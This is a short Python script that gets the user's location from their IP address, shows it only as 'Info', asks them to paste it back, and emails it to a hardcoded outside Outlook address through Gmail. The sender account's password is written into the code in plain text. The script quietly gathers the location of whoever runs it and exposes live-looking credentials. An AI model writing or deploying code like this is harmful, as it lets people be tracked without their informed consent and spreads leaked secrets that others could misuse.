import geocoder
from email.message import EmailMessage
import ssl
import smtplib

g = geocoder.ip('me')

print(f"""
-------------------------

Info --> {g.latlng}

-------------------------
""")


email_sender = 'CodeNum0001@gmail.com'
email_password = 'bwormkmxsstfnflk'
email_recever = "gtmiller2008@outlook.com"
subject = "Location"
print("Copy and past the info above. ")
print("Include [] , . -")
body = input("Past info here --> ")
em = EmailMessage()
em['From'] = email_sender
em['To'] = email_recever
em['subject'] = subject
em.set_content(body)
context = ssl.create_default_context()

print("Sending info...")

with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_recever, em.as_string())
    print("Info sent!")
    print("Thank you!")